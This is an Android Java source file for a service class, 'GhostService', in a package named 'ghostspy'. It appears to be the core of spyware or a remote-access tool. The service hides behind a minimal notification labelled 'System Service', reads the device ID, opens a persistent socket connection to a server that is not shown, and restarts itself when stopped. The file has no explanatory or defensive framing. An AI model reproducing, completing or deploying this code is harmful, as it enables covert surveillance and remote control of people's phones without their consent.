package com.ghostspy;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;

public class GhostService extends Service {
    private SocketClient socket;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, buildNotification());
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        socket = new SocketClient(deviceId);
        socket.connect();
    }

    private Notification buildNotification() {
        String chId = "ghost";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(chId, "System", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        return new Notification.Builder(this, chId)
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
}
